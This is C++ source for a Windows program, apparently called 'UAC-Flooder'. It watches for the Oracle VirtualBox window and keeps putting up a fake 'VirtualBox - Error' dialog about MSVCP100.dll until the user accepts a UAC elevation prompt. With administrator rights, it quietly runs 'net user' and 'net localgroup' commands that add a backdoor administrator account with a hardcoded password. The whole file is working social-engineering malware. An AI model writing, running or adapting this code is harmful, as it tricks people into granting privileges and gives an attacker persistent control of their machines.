#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

#include "mi_ventana.hpp"
#include <Windows.h>
#include <iostream>
#include <WinUser.h>
#include <locale>
#include <vector>

using namespace std;

#define FIND  "Oracle VM VirtualBox Administrador"
#define archivo "C:\\Users\\Ivar\\Desktop\\TRABAJO\\UAC-Flooder-master\\prueba.txt"
#define TITULO_VENTANA "VirtualBox - Error"
#define TEXTO_VENTANA " No se pudo cargar correctamente MSVCP100.dll.\n Quiere hacerlo manualmente?"

bool CheckIfAdmin()
{
	BOOL RunAdmin = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize))
		{
			RunAdmin = Elevation.TokenIsElevated;
		}
		CloseHandle(hToken);
	}

	return RunAdmin;
}

bool Elevate()
{
	char PathProg[MAX_PATH];
	// bool elevated = false;
	if (GetModuleFileNameA(NULL, PathProg, MAX_PATH))
	{
		SHELLEXECUTEINFOA SEIA = { sizeof(SEIA) };
		SEIA.lpVerb = "runas";
		SEIA.lpFile = PathProg;
		SEIA.hwnd = NULL;
		SEIA.nShow = SW_HIDE;
		//SEIA.fMask = SEE_MASK_NOCLOSEPROCESS;


		return ShellExecuteExA(&SEIA);
		//WaitForSingleObject(SEIA.hProcess,INFINITE);
	}
	return false;
}

bool ExecuteCommand(const char* path_program, char* parameters) {

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	if (CreateProcess(path_program, parameters, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
		return true;
	}
	return false;
}

std::string GetWindowStringText(HWND hwnd)
{
	int len = GetWindowTextLength(hwnd) + 1;
	std::vector<char> buf(len);
	GetWindowText(hwnd, buf.data(), len);
	std::string wide = buf.data();
	return wide;
}

void SleepSeconds(DWORD seconds) {
	Sleep(seconds * 1000);
}

HWND FindVirtualBoxWindow() {
	std::string str;
	std::string win;
	HWND hwnd;
	do {
		hwnd = GetForegroundWindow();
		win = GetWindowStringText(hwnd);
		if (str != win) {
			//std::wcout << win << '\n';
			str = win;
		}
		Sleep(700);
	} while (FIND != win);
	return hwnd;
}

// si w fuera una referencia no se llama al destructor y  esto tiene sentido claro que lo tiene
WORD show(CustomWindow w, HWND parent) {

	bool correct = w.CreateNewWindow(parent, TITULO_VENTANA, TEXTO_VENTANA);
	if (!correct) {
		//MessageBox(NULL,L"fatal" , L"boton si",MB_YESNO | MB_ICONERROR);
		return 0; // error se cerro virtualbox por lo tanto el hwnd no es valido
	}
	w.Center(parent);
	w.Show();
	return w.GetAnswer();
}

// mostrar mensaje de error cada 5 segundos para molestar un poco ;)
void desquiciar() {
	CustomWindow w;
	// al cerrar virtualbox nuestra aplicacion sigue funcionando en segundo plano pero no muestra el mensaje molesto...
	do {
		HWND vbox = FindVirtualBoxWindow();
		while (!IsIconic(vbox)) {
			if (show(w, vbox) == IDYES) { //MessageBox(vbox,TEXTO_VENTANA , TITULO_VENTANA,MB_YESNO | MB_ICONERROR) == IDYES
				if (Elevate()) {
					ExitProcess(0); // salir del proceso padre, el hijo es el PRIVILEGIADO
				}
			}

			if (GetLastError()) { // SI QUITO ERROR_INVALID... AL CERRAR LA VENTANA O PULSAR EN NO, NO SE MUESTRA OTRA VEZ, PIERDO EL FOCO DE LA VENTANA PADRE
				break;
			}
			SleepSeconds(2);
		}
	} while (true);

}
// cl main.cpp /EHsc /DUNICODE /link /subsystem:windows
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	FreeConsole();

	setlocale(LC_ALL, "");
	if (!CheckIfAdmin())
		desquiciar();

	ExecuteCommand("C:\\Windows\\system32\\cmd.exe", (char *)"/c net user nuevo granhermano /add");
	ExecuteCommand("C:\\Windows\\system32\\cmd.exe", (char*)"/c net localgroup administradores nuevo /add");

	return 0;
}
